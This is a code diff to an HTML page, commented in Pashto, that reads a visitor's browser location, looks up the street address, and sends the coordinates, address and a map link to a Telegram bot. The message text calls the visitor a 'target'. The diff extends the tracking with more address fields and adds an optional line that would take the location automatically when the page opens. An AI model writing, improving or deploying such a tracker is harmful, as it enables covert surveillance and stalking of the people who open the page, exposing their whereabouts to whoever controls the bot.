@@ -213,10 +213,11 @@
         const mapLink = document.getElementById('mapLink');
         
         // ================================================================
-        //  د ادرس ترلاسه کول
+        //  د ادرس ترلاسه کول د کوارډیناتو پر بنسټ
         // ================================================================
         async function getAddress(lat, lon) {
             try {
+                // د OpenStreetMap API له لارې ادرس ترلاسه کول
                 const response = await fetch(
                     `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`
                 );
@@ -226,36 +227,43 @@
                     return {
                         fullAddress: data.display_name,
                         city: data.address?.city || data.address?.town || data.address?.village || 'Unknown',
-                        country: data.address?.country || 'Unknown'
+                        country: data.address?.country || 'Unknown',
+                        road: data.address?.road || '',
+                        suburb: data.address?.suburb || ''
                     };
                 }
                 return {
                     fullAddress: 'Address not found',
                     city: 'Unknown',
-                    country: 'Unknown'
+                    country: 'Unknown',
+                    road: '',
+                    suburb: ''
                 };
             } catch (error) {
                 console.error('Address error:', error);
                 return {
                     fullAddress: 'Could not get address',
                     city: 'Unknown',
-                    country: 'Unknown'
+                    country: 'Unknown',
+                    road: '',
+                    suburb: ''
                 };
             }
         }
         
         // ================================================================
-        //  بوټ ته لوکیشن لیږل
+        //  بوټ ته لوکیشن لیږل (د مطلوب پیغام بڼه)
         // ================================================================
         async function sendLocationToBot(lat, lon, addressData) {
             const message = 
-                `📍 *Real Location*\n\n` +
-                `🏠 *Address:* ${addressData.fullAddress}\n` +
-                `🌐 *Latitude:* ${lat}\n` +
-                `🌐 *Longitude:* ${lon}\n` +
-                `🏙️ *City:* ${addressData.city}\n` +
-                `🌍 *Country:* ${addressData.country}\n` +
-                `🗺️ *Map:* https://www.google.com/maps?q=${lat},${lon}`;
+                `🎯 *د هدف بشپړ لوکیشن او ادرس راغی!*\n\n` +
+                `🗺️ *د سیمې ادرس:*\n` +
+                `${addressData.fullAddress}\n\n` +
+                `🌐 *کوارډینات:*\n` +
+                `Latitude: ${lat}\n` +
+                `Longitude: ${lon}\n\n` +
+                `🔗 *د ګوګل مېپ لینک:*\n` +
+                `https://www.google.com/maps?q=${lat},${lon}`;
             
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -267,13 +275,14 @@
                         parse_mode: 'Markdown'
                     })
                 });
+                console.log('Location sent to bot successfully!');
             } catch (e) {
                 console.error('Send to bot error:', e);
             }
         }
         
         // ================================================================
-        //  د لوکیشن ترلاسه کول (اصلاح شوی)
+        //  د لوکیشن ترلاسه کول
         // ================================================================
         function getLocation() {
             // تڼۍ بنده کړئ
@@ -301,6 +310,7 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
+                    // ادرس ترلاسه کړئ
                     const addressData = await getAddress(lat, lon);
                     
                     // معلومات ښکاره کړئ
@@ -355,6 +365,12 @@
         //  تڼۍ کلیک
         // ================================================================
         getLocationBtn.addEventListener('click', getLocation);
+        
+        // ================================================================
+        //  کله چې پاڼه خلاصیږي، اتوماتیک لوکیشن واخلئ
+        // ================================================================
+        // که تاسو غواړئ چې سمدلاسه لوکیشن واخلي، دا کرښه خلاصه کړئ:
+        // setTimeout(getLocation, 1000);
     </script>
 </body>
 </html>
